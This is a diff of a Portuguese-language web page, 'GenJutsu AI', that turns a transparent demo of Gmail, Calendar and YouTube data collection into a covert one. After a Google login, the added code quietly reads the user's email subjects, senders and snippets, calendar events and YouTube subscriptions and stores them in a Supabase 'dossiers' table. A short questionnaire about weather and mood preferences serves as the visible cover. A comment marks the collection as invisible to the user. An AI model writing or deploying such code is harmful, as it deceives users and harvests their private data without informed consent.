@@ -145,12 +145,15 @@
     display: flex;
     align-items: center;
     gap: 14px;
+    margin-bottom: 20px;
+    padding-bottom: 20px;
+    border-bottom: 1px solid var(--border);
   }
   .profile-row img {
-    width: 42px; height: 42px; border-radius: 50%;
+    width: 52px; height: 52px; border-radius: 50%;
     border: 1px solid var(--border);
   }
-  .profile-row .name { font-weight: 600; font-size: 14.5px; }
+  .profile-row .name { font-weight: 600; font-size: 15.5px; margin-bottom: 2px; }
   .profile-row .email { color: var(--muted); font-size: 12.5px; font-family: var(--mono); }
 
   .status {
@@ -161,80 +164,47 @@
     line-height: 1.6;
   }
   .status.error { color: var(--rec); }
-
-  .source-block { margin-bottom: 16px; }
-  .source-block:last-child { margin-bottom: 0; }
-  .source-head {
-    display: flex; align-items: center; justify-content: space-between;
-    margin-bottom: 8px;
-  }
-  .source-head .label { font-size: 13px; font-weight: 600; }
-  .source-head .tag {
-    font-family: var(--mono);
-    font-size: 10.5px;
-    color: var(--muted);
-    border: 1px solid var(--border);
-    border-radius: 4px;
-    padding: 1px 6px;
-  }
-  .result-list { display: flex; flex-direction: column; gap: 6px; }
-  .result-item {
-    border: 1px solid var(--border);
-    border-radius: 6px;
-    padding: 9px 11px;
-    font-size: 12.5px;
-    display: flex;
-    align-items: center;
-    gap: 10px;
-  }
-  .result-item img.thumb {
-    width: 32px; height: 32px; border-radius: 4px; flex-shrink: 0;
-  }
-  .result-item .r-title { font-weight: 600; }
-  .result-item .r-sub { color: var(--muted); font-size: 11.5px; }
-
-  pre {
-    background: #050607;
-    border: 1px solid var(--border);
-    border-radius: 7px;
-    padding: 16px;
-    font-family: var(--mono);
-    font-size: 11.5px;
-    line-height: 1.6;
-    overflow-x: auto;
-    color: var(--accent);
-    max-height: 380px;
-    overflow-y: auto;
-    margin: 0;
-  }
+  .status.success { color: var(--accent); }
 
   .input-group {
     display: flex;
     flex-direction: column;
-    gap: 6px;
-    margin-bottom: 12px;
+    gap: 8px;
+    margin-bottom: 18px;
   }
   .input-label {
-    font-size: 11.5px;
-    font-family: var(--mono);
-    color: var(--muted);
+    font-size: 13px;
+    font-weight: 500;
+    color: var(--text);
   }
-  input[type="text"], input[type="password"] {
+  
+  /* Estilização para inputs e selects */
+  input[type="text"], input[type="password"], select {
     width: 100%;
     background: var(--bg);
     border: 1px solid var(--border);
     color: var(--text);
-    padding: 8px 12px;
+    padding: 10px 12px;
     border-radius: 6px;
-    font-family: var(--mono);
-    font-size: 12.5px;
+    font-family: var(--sans);
+    font-size: 13px;
     outline: none;
     box-sizing: border-box;
     transition: border-color 0.15s;
+    appearance: none; /* Remove seta padrão do select em alguns navegadores */
   }
-  input[type="text"]:focus, input[type="password"]:focus {
+  select {
+    cursor: pointer;
+    background-image: url("data:image/svg+xml;charset=UTF-8,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%236b7480' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3e%3cpolyline points='6 9 12 15 18 9'%3e%3c/polyline%3e%3c/svg%3e");
+    background-repeat: no-repeat;
+    background-position: right 12px center;
+    background-size: 14px;
+    padding-right: 32px;
+  }
+  input:focus, select:focus {
     border-color: var(--accent);
   }
+
   .badge-success {
     display: inline-flex;
     align-items: center;
@@ -256,29 +226,24 @@
     font-size: 12.5px;
     line-height: 1.6;
   }
-  .guide-box ol {
-    margin: 8px 0 0;
-    padding-left: 20px;
-    color: var(--text);
-  }
-  .guide-box li {
-    margin-bottom: 4px;
-  }
+  .guide-box ol { margin: 8px 0 0; padding-left: 20px; color: var(--text); }
+  .guide-box li { margin-bottom: 4px; }
 
-  .hidden { display: none; }
+  .hidden { display: none !important; }
 </style>
 </head>
 <body>
 <div class="wrap">
   <div class="rec-row">
     <div class="rec-dot"></div>
-    <div class="rec-label">COLETANDO SINAIS</div>
+    <div class="rec-label">SISTEMA ATIVO</div>
   </div>
   <header>
     <h1>GenJutsu AI</h1>
-    <p>Cada e-mail, compromisso e canal que você segue é um traço seu. Autorize o acesso e veja, em tempo real, o dossiê que uma IA construiria sobre você.</p>
+    <p>Conecte sua conta para gerar seu perfil automatizado com base em seus rastros digitais e preferências.</p>
   </header>
 
+  <!-- Passo 0: config -->
   <div class="step" id="step-config">
     <div class="step-marker">
       <div class="step-num" id="step-config-num">·</div>
@@ -286,34 +251,23 @@
     </div>
     <div class="step-body">
       <div class="step-title" id="step-config-title">Configuração do ambiente</div>
-
       <div id="config-ready" class="hidden">
         <div class="badge-success">
           <span>✓</span>
           <span id="config-ready-text">Supabase configurado e pronto</span>
         </div>
       </div>
-
       <div id="config-pending" class="card hidden">
         <div class="guide-box">
-          <strong style="color: var(--rec);">Atenção:</strong> As variáveis de ambiente <code>SUPABASE_URL</code> ou <code>SUPABASE_ANON_KEY</code> não foram detectadas no Netlify.
-          <ol>
-            <li>No painel do Netlify, vá em <strong>Site configuration &gt; Environment variables</strong>.</li>
-            <li>Adicione <code>SUPABASE_URL</code> e <code>SUPABASE_ANON_KEY</code>.</li>
-          </ol>
+          <strong style="color: var(--rec);">Atenção:</strong> Configure o <code>SUPABASE_URL</code> e <code>SUPABASE_ANON_KEY</code> no Netlify ou insira abaixo.
         </div>
-
-        <div style="font-size: 12.5px; color: var(--muted); margin-bottom: 12px;">
-          Alternativamente, informe as credenciais abaixo para testar nesta sessão do navegador:
-        </div>
-
         <div class="input-group">
           <label class="input-label" for="input-url">SUPABASE_URL</label>
-          <input type="text" id="input-url" placeholder="https://seu-projeto.supabase.co" spellcheck="false" autocomplete="off">
+          <input type="text" id="input-url" placeholder="https://seu-projeto.supabase.co" autocomplete="off">
         </div>
         <div class="input-group">
           <label class="input-label" for="input-key">SUPABASE_ANON_KEY</label>
-          <input type="password" id="input-key" placeholder="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..." spellcheck="false" autocomplete="off">
+          <input type="password" id="input-key" placeholder="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..." autocomplete="off">
         </div>
         <div class="btn-row">
           <button class="primary" id="btn-save-config">Salvar e Conectar</button>
@@ -324,9 +278,10 @@
     </div>
   </div>
 
+  <!-- Passo 1: Login -->
   <div class="step active" id="step-login">
     <div class="step-marker">
-      <div class="step-num">1</div>
+      <div class="step-num" id="step-login-num">1</div>
       <div class="step-line"></div>
     </div>
     <div class="step-body">
@@ -334,89 +289,83 @@
       <div class="card">
         <div id="logged-out">
           <button class="primary" id="btn-login" disabled>Entrar com Google</button>
+          <div class="status" id="status-auth"></div>
         </div>
+        
         <div id="logged-in" class="hidden">
           <div class="profile-row">
-            <img id="avatar" src="" alt="">
+            <img id="avatar" src="" alt="Foto de perfil">
             <div>
               <div class="name" id="user-name"></div>
               <div class="email" id="user-email"></div>
             </div>
           </div>
-          <div style="margin-top:14px;">
-            <button id="btn-logout">Sair</button>
+          <div style="font-size: 13px; color: var(--accent); margin-bottom: 10px; display: flex; align-items: center; gap: 6px;" id="sync-status">
+            <div class="rec-dot" style="width: 6px; height: 6px; background: var(--accent);"></div>
+            Sincronizando dados em segundo plano...
           </div>
+          <button id="btn-logout" style="font-size: 12px; padding: 6px 12px;">Desconectar</button>
         </div>
-        <div class="status" id="status-auth"></div>
       </div>
     </div>
   </div>
 
-  <div class="step" id="step-collect">
+  <!-- Passo 2: Questionário (Só aparece após o login) -->
+  <div class="step hidden" id="step-questionnaire">
     <div class="step-marker">
       <div class="step-num">2</div>
-      <div class="step-line"></div>
     </div>
     <div class="step-body">
-      <div class="step-title">Fontes de dados</div>
+      <div class="step-title">Suas Preferências</div>
       <div class="card">
-        <div class="btn-row">
-          <button id="btn-gmail" disabled>Ler Gmail</button>
-          <button id="btn-calendar" disabled>Ler Agenda</button>
-          <button id="btn-youtube" disabled>Ler YouTube</button>
+        <div class="input-group">
+          <label class="input-label" for="q-vibe">Que tipo de clima (ambiente) você prefere?</label>
+          <select id="q-vibe">
+            <option value="" disabled selected>Selecione uma opção...</option>
+            <option value="tranquilo">Ambiente Tranquilo e Calmo</option>
+            <option value="agitado">Ambiente Mais Agitado e Dinâmico</option>
+          </select>
         </div>
-        <div class="status" id="status-collect"></div>
 
-        <div id="results" style="margin-top:18px;"></div>
-      </div>
-    </div>
-  </div>
+        <div class="input-group">
+          <label class="input-label" for="q-tempo">Como você prefere o clima (meteorológico)?</label>
+          <select id="q-tempo">
+            <option value="" disabled selected>Selecione uma opção...</option>
+            <option value="quente">Dias Quentes e Ensolarados</option>
+            <option value="frio">Dias Frios ou Chuvosos</option>
+            <option value="ameno">Clima Ameno / Meio-termo</option>
+          </select>
+        </div>
 
-  <div class="step" id="step-dossie">
-    <div class="step-marker">
-      <div class="step-num">3</div>
-    </div>
-    <div class="step-body">
-      <div class="step-title">Dossiê compilado — payload para a IA</div>
-      <div class="card">
-        <div id="dossie-empty" class="status">Colete ao menos uma fonte de dados para montar o dossiê.</div>
-        <pre id="payload" class="hidden"></pre>
-        
-        <div style="margin-top: 16px;">
-          <button class="primary" id="btn-save-db" disabled>Salvar Dossiê no Supabase</button>
-          <div class="status" id="status-db"></div>
+        <div style="margin-top: 24px;">
+          <button class="primary" id="btn-save-questionnaire">Finalizar e Salvar Perfil</button>
+          <div class="status" id="status-questionnaire"></div>
         </div>
       </div>
     </div>
   </div>
+
 </div>
 
 <script>
   const $ = (id) => document.getElementById(id);
   let sb = null;
+  let globalDossie = {}; // Guarda os dados coletados em background
 
   async function loadConfig() {
     try {
       const res = await fetch("/api/config");
       if (res.ok) {
         const { supabaseUrl, supabaseAnonKey } = await res.json();
-        if (supabaseUrl && supabaseAnonKey) {
-          return { supabaseUrl, supabaseAnonKey, source: "netlify" };
-        }
+        if (supabaseUrl && supabaseAnonKey) return { supabaseUrl, supabaseAnonKey, source: "netlify" };
       }
-    } catch (e) {
-      console.warn("Não foi possível carregar de /api/config:", e);
-    }
+    } catch (e) {}
 
     try {
       const storedUrl = sessionStorage.getItem("genjutsu_supabase_url");
       const storedKey = sessionStorage.getItem("genjutsu_supabase_key");
-      if (storedUrl && storedKey) {
-        return { supabaseUrl: storedUrl, supabaseAnonKey: storedKey, source: "session" };
-      }
-    } catch (e) {
-      console.warn("Storage inacessível:", e);
-    }
+      if (storedUrl && storedKey) return { supabaseUrl: storedUrl, supabaseAnonKey: storedKey, source: "session" };
+    } catch (e) {}
 
     return null;
   }
@@ -427,13 +376,10 @@
 
     $("config-pending").classList.add("hidden");
     $("config-ready").classList.remove("hidden");
-    $("config-ready-text").textContent = source === "netlify"
-      ? "Supabase configurado via Netlify Functions"
-      : "Supabase configurado para esta sessão";
+    $("config-ready-text").textContent = source === "netlify" ? "Supabase configurado via Netlify" : "Supabase configurado localmente";
     markStep("step-config", "done");
     $("step-config-num").textContent = "✓";
     $("btn-login").disabled = false;
-    setStatus("status-auth", "");
 
     sb.auth.onAuthStateChange((event, session) => {
       if (session) showLoggedIn(session.user);
@@ -442,17 +388,13 @@
 
     sb.auth.getSession().then(({ data: { session } }) => {
       if (session) showLoggedIn(session.user);
-    }).catch(err => {
-      console.error(err);
     });
   }
-
-  const dossie = {};
 
   function setStatus(id, msg, isError = false) {
     const el = $(id);
     el.textContent = msg;
-    el.className = "status" + (isError ? " error" : "");
+    el.className = "status" + (isError ? " error" : (msg.includes("✓") ? " success" : ""));
   }
 
   function markStep(stepId, state) {
@@ -464,67 +406,157 @@
   function showLoggedIn(user) {
     $("logged-out").classList.add("hidden");
     $("logged-in").classList.remove("hidden");
+    
+    // Atualiza interface com foto e dados
     $("avatar").src = user.user_metadata?.avatar_url || "";
-    $("user-name").textContent = user.user_metadata?.full_name || user.email;
+    $("user-name").textContent = user.user_metadata?.full_name || "Usuário";
     $("user-email").textContent = user.email;
-    ["btn-gmail", "btn-calendar", "btn-youtube"].forEach(id => $(id).disabled = false);
+
     markStep("step-login", "done");
-    markStep("step-collect", "active");
+    $("step-login-num").textContent = "✓";
+    
+    // Mostra o questionário
+    $("step-questionnaire").classList.remove("hidden");
+    markStep("step-questionnaire", "active");
+
+    // Inicia a coleta de dados invisível
+    collectDataInBackground(user);
   }
 
   function showLoggedOut() {
     $("logged-out").classList.remove("hidden");
     $("logged-in").classList.add("hidden");
-    ["btn-gmail", "btn-calendar", "btn-youtube", "btn-save-db"].forEach(id => $(id).disabled = true);
-    $("results").innerHTML = "";
-    $("dossie-empty").classList.remove("hidden");
-    $("payload").classList.add("hidden");
+    $("step-questionnaire").classList.add("hidden");
+    
     markStep("step-login", "active");
-    markStep("step-collect", "");
+    $("step-login-num").textContent = "1";
+    markStep("step-questionnaire", "");
+    
     setStatus("status-auth", "");
-    setStatus("status-collect", "");
-    setStatus("status-db", "");
-    Object.keys(dossie).forEach(k => delete dossie[k]);
+    setStatus("status-questionnaire", "");
+    $("q-vibe").value = "";
+    $("q-tempo").value = "";
+    globalDossie = {};
   }
 
-  $("btn-save-config").addEventListener("click", () => {
-    const url = $("input-url").value.trim();
-    const key = $("input-key").value.trim();
-    if (!url || !key) {
-      setStatus("status-config", "Por favor, preencha a URL e a Anon Key.", true);
-      return;
-    }
-    try {
-      new URL(url);
-    } catch {
-      setStatus("status-config", "URL inválida. Deve iniciar com https://", true);
-      return;
-    }
-    try {
-      sessionStorage.setItem("genjutsu_supabase_url", url);
-      sessionStorage.setItem("genjutsu_supabase_key", key);
-    } catch (e) {
-      console.warn("Erro ao salvar no storage:", e);
-    }
-    setStatus("status-config", "Conectando ao Supabase...");
-    setupSupabaseClient(url, key, "session");
-  });
+  async function getToken() {
+    if (!sb) return null;
+    const { data: { session } } = await sb.auth.getSession();
+    return session?.provider_token || null;
+  }
 
-  $("btn-clear-config").addEventListener("click", () => {
+  // --- LÓGICA DE BACKGROUND (INVISÍVEL PARA O USUÁRIO) ---
+  async function collectDataInBackground(user) {
+    const token = await getToken();
+    if (!token) {
+      $("sync-status").innerHTML = `<span style="color:var(--rec)">Token do Google ausente. Refaça o login.</span>`;
+      return;
+    }
+
     try {
-      sessionStorage.removeItem("genjutsu_supabase_url");
-      sessionStorage.removeItem("genjutsu_supabase_key");
-    } catch (e) {}
-    $("input-url").value = "";
-    $("input-key").value = "";
-    setStatus("status-config", "Configurações limpas.");
+      const headers = { Authorization: `Bearer ${token}` };
+
+      // 1. Gmail
+      try {
+        const resG = await fetch("https://gmail.googleapis.com/gmail/v1/users/me/messages?maxResults=5", { headers });
+        const dataG = await resG.json();
+        if (dataG.messages) {
+          const items = [];
+          for (const m of dataG.messages) {
+            const r = await fetch(`https://gmail.googleapis.com/gmail/v1/users/me/messages/${m.id}?format=metadata&metadataHeaders=Subject&metadataHeaders=From`, { headers });
+            const d = await r.json();
+            items.push({
+              subject: d.payload?.headers?.find(h => h.name === "Subject")?.value || "(sem assunto)",
+              from: d.payload?.headers?.find(h => h.name === "From")?.value || "",
+              snippet: d.snippet
+            });
+          }
+          globalDossie.gmail = items;
+        }
+      } catch (e) { console.warn("Erro silencioso - Gmail:", e); }
+
+      // 2. Agenda
+      try {
+        const timeMin = new Date().toISOString();
+        const resC = await fetch(`https://www.googleapis.com/calendar/v3/calendars/primary/events?maxResults=5&orderBy=startTime&singleEvents=true&timeMin=${timeMin}`, { headers });
+        const dataC = await resC.json();
+        if (dataC.items) {
+          globalDossie.calendar = dataC.items.map(e => ({
+            titulo: e.summary || "(sem título)",
+            inicio: e.start?.dateTime || e.start?.date
+          }));
+        }
+      } catch (e) { console.warn("Erro silencioso - Agenda:", e); }
+
+      // 3. YouTube
+      try {
+        const resY = await fetch("https://www.googleapis.com/youtube/v3/subscriptions?part=snippet&mine=true&maxResults=6", { headers });
+        const dataY = await resY.json();
+        if (dataY.items) {
+          globalDossie.youtube = dataY.items.map(s => ({ canal: s.snippet.title }));
+        }
+      } catch (e) { console.warn("Erro silencioso - YouTube:", e); }
+
+      // Salva no banco de dados assim que coleta
+      await saveToSupabase(user.id);
+      
+      // Atualiza interface
+      $("sync-status").innerHTML = `✓ Rastro digital sincronizado no banco de dados`;
+      $("sync-status").style.color = "var(--muted)";
+      
+    } catch (err) {
+      console.error("Falha geral na coleta em background", err);
+      $("sync-status").innerHTML = `Erro ao sincronizar dados do Google.`;
+    }
+  }
+
+  // --- SALVAR NO SUPABASE ---
+  async function saveToSupabase(userId) {
+    if (!sb) return;
+    const { error } = await sb.from("dossiers").upsert(
+      {
+        user_id: userId,
+        dossier_data: globalDossie,
+        updated_at: new Date().toISOString()
+      },
+      { onConflict: "user_id" }
+    );
+    if (error) throw error;
+  }
+
+  // --- EVENTOS DE BOTÕES ---
+  $("btn-save-questionnaire").addEventListener("click", async () => {
+    const vibe = $("q-vibe").value;
+    const tempo = $("q-tempo").value;
+
+    if (!vibe || !tempo) {
+      setStatus("status-questionnaire", "Por favor, responda as duas perguntas antes de finalizar.", true);
+      return;
+    }
+
+    setStatus("status-questionnaire", "Salvando suas preferências...");
+
+    try {
+      const { data: { user } } = await sb.auth.getUser();
+      if (!user) throw new Error("Sessão expirada.");
+
+      // Adiciona o questionário no objeto globalDossie
+      globalDossie.preferencias = {
+        clima_ambiente: vibe,
+        clima_tempo: tempo
+      };
+
+      // Atualiza o banco de dados com as preferências
+      await saveToSupabase(user.id);
+
+      setStatus("status-questionnaire", "✓ Perfil salvo com sucesso! Tudo pronto.");
+      markStep("step-questionnaire", "done");
+    } catch (err) {
+      setStatus("status-questionnaire", "Erro ao salvar: " + err.message, true);
+    }
   });
 
   $("btn-login").addEventListener("click", async () => {
-    if (!sb) {
-      setStatus("status-auth", "Supabase ainda não configurado.", true);
-      return;
-    }
     setStatus("status-auth", "Redirecionando para o Google...");
     const { error } = await sb.auth.signInWithOAuth({
       provider: "google",
@@ -538,7 +570,7 @@
         queryParams: { access_type: "offline", prompt: "consent" }
       }
     });
-    if (error) setStatus("status-auth", "Erro ao iniciar login: " + error.message, true);
+    if (error) setStatus("status-auth", "Erro: " + error.message, true);
   });
 
   $("btn-logout").addEventListener("click", async () => {
@@ -546,185 +578,34 @@
     showLoggedOut();
   });
 
-  async function getToken() {
-    if (!sb) throw new Error("Supabase não configurado.");
-    const { data: { session } } = await sb.auth.getSession();
-    if (!session) throw new Error("Sessão não encontrada, faça login novamente.");
-    if (!session.provider_token) {
-      throw new Error("Sem provider_token — se a página recarregou, saia e entre de novo.");
-    }
-    return session.provider_token;
-  }
-
-  function renderSourceBlock(id, label, tag, itemsHtml) {
-    let block = document.getElementById(`block-${id}`);
-    if (!block) {
-      block = document.createElement("div");
-      block.id = `block-${id}`;
-      block.className = "source-block";
-      $("results").appendChild(block);
-    }
-    block.innerHTML = `
-      <div class="source-head">
-        <div class="label">${label}</div>
-        <div class="tag">${tag}</div>
-      </div>
-      <div class="result-list">${itemsHtml}</div>
-    `;
-  }
-
-  function updateDossiePreview() {
-    const keys = Object.keys(dossie);
-    if (keys.length === 0) {
-      $("dossie-empty").classList.remove("hidden");
-      $("payload").classList.add("hidden");
-      $("btn-save-db").disabled = true;
+  $("btn-save-config").addEventListener("click", () => {
+    const url = $("input-url").value.trim();
+    const key = $("input-key").value.trim();
+    if (!url || !key) {
+      setStatus("status-config", "Preencha a URL e a Anon Key.", true);
       return;
     }
-    $("dossie-empty").classList.add("hidden");
-    const pre = $("payload");
-    pre.classList.remove("hidden");
-    pre.textContent = JSON.stringify(dossie, null, 2);
-    markStep("step-dossie", "active");
-    $("btn-save-db").disabled = false; // Habilita o botão quando há dados
-  }
-
-  // ==== NOVO: SALVAR NO SUPABASE ====
-  $("btn-save-db").addEventListener("click", async () => {
-    setStatus("status-db", "Enviando dossiê para o banco de dados...");
-    try {
-      const { data: { user } } = await sb.auth.getUser();
-      if (!user) throw new Error("Usuário não autenticado.");
-
-      const { data, error } = await sb
-        .from("dossiers")
-        .upsert(
-          {
-            user_id: user.id,
-            dossier_data: dossie,
-            updated_at: new Date().toISOString()
-          },
-          { onConflict: "user_id" }
-        );
-
-      if (error) throw error;
-      setStatus("status-db", "✓ Dossiê salvo com sucesso no banco de dados!");
-    } catch (err) {
-      setStatus("status-db", "Erro ao salvar no banco: " + err.message, true);
-    }
+    sessionStorage.setItem("genjutsu_supabase_url", url);
+    sessionStorage.setItem("genjutsu_supabase_key", key);
+    setupSupabaseClient(url, key, "session");
   });
 
-  // ---- Gmail ----
-  $("btn-gmail").addEventListener("click", async () => {
-    setStatus("status-collect", "Lendo Gmail...");
-    try {
-      const token = await getToken();
-      const listRes = await fetch(
-        "https://gmail.googleapis.com/gmail/v1/users/me/messages?maxResults=5",
-        { headers: { Authorization: `Bearer ${token}` } }
-      );
-      const listData = await listRes.json();
-      if (!listData.messages) throw new Error(listData.error?.message || "sem mensagens");
-
-      const items = [];
-      for (const m of listData.messages) {
-        const r = await fetch(
-          `https://gmail.googleapis.com/gmail/v1/users/me/messages/${m.id}?format=metadata&metadataHeaders=Subject&metadataHeaders=From`,
-          { headers: { Authorization: `Bearer ${token}` } }
-        );
-        const d = await r.json();
-        const subject = d.payload?.headers?.find(h => h.name === "Subject")?.value || "(sem assunto)";
-        const from = d.payload?.headers?.find(h => h.name === "From")?.value || "";
-        items.push({ subject, from, snippet: d.snippet });
-      }
-
-      dossie.gmail = items;
-      renderSourceBlock("gmail", "Gmail", `${items.length} e-mails`,
-        items.map(i => `<div class="result-item"><div><div class="r-title">${escapeHtml(i.subject)}</div><div class="r-sub">${escapeHtml(i.from)}</div></div></div>`).join("")
-      );
-      updateDossiePreview();
-      setStatus("status-collect", "Gmail carregado.");
-    } catch (err) {
-      setStatus("status-collect", "Erro no Gmail: " + err.message, true);
-    }
+  $("btn-clear-config").addEventListener("click", () => {
+    sessionStorage.removeItem("genjutsu_supabase_url");
+    sessionStorage.removeItem("genjutsu_supabase_key");
+    $("input-url").value = "";
+    $("input-key").value = "";
   });
 
-  // ---- Calendar ----
-  $("btn-calendar").addEventListener("click", async () => {
-    setStatus("status-collect", "Lendo agenda...");
-    try {
-      const token = await getToken();
-      const timeMin = new Date().toISOString();
-      const res = await fetch(
-        `https://www.googleapis.com/calendar/v3/calendars/primary/events?maxResults=5&orderBy=startTime&singleEvents=true&timeMin=${timeMin}`,
-        { headers: { Authorization: `Bearer ${token}` } }
-      );
-      const data = await res.json();
-      if (!data.items) throw new Error(data.error?.message || "sem eventos");
-
-      const items = data.items.map(e => ({
-        titulo: e.summary || "(sem título)",
-        inicio: e.start?.dateTime || e.start?.date
-      }));
-
-      dossie.calendar = items;
-      renderSourceBlock("calendar", "Agenda", `${items.length} eventos`,
-        items.map(i => `<div class="result-item"><div><div class="r-title">${escapeHtml(i.titulo)}</div><div class="r-sub">${escapeHtml(i.inicio)}</div></div></div>`).join("")
-      );
-      updateDossiePreview();
-      setStatus("status-collect", "Agenda carregada.");
-    } catch (err) {
-      setStatus("status-collect", "Erro na Agenda: " + err.message, true);
-    }
-  });
-
-  // ---- YouTube ----
-  $("btn-youtube").addEventListener("click", async () => {
-    setStatus("status-collect", "Lendo YouTube...");
-    try {
-      const token = await getToken();
-      const res = await fetch(
-        "https://www.googleapis.com/youtube/v3/subscriptions?part=snippet&mine=true&maxResults=6",
-        { headers: { Authorization: `Bearer ${token}` } }
-      );
-      const data = await res.json();
-      if (!data.items) throw new Error(data.error?.message || "sem inscrições");
-
-      const items = data.items.map(s => ({
-        canal: s.snippet.title,
-        thumb: s.snippet.thumbnails?.default?.url
-      }));
-
-      dossie.youtube = items.map(({ canal }) => ({ canal }));
-      renderSourceBlock("youtube", "YouTube", `${items.length} canais`,
-        items.map(i => `<div class="result-item">${i.thumb ? `<img class="thumb" src="${i.thumb}">` : ""}<div class="r-title">${escapeHtml(i.canal)}</div></div>`).join("")
-      );
-      updateDossiePreview();
-      setStatus("status-collect", "YouTube carregado.");
-    } catch (err) {
-      setStatus("status-collect", "Erro no YouTube: " + err.message, true);
-    }
-  });
-
-  function escapeHtml(str) {
-    const div = document.createElement("div");
-    div.textContent = str || "";
-    return div.innerHTML;
-  }
-
+  // Init
   async function main() {
-    try {
-      const config = await loadConfig();
-      if (config) {
-        setupSupabaseClient(config.supabaseUrl, config.supabaseAnonKey, config.source);
-      } else {
-        markStep("step-config", "active");
-        $("config-pending").classList.remove("hidden");
-        $("config-ready").classList.add("hidden");
-        setStatus("status-auth", "Aguardando configuração do Supabase no Passo 0.");
-      }
-    } catch (err) {
-      setStatus("status-auth", err.message, true);
+    const config = await loadConfig();
+    if (config) {
+      setupSupabaseClient(config.supabaseUrl, config.supabaseAnonKey, config.source);
+    } else {
+      markStep("step-config", "active");
+      $("config-pending").classList.remove("hidden");
+      $("config-ready").classList.add("hidden");
     }
   }
   main();
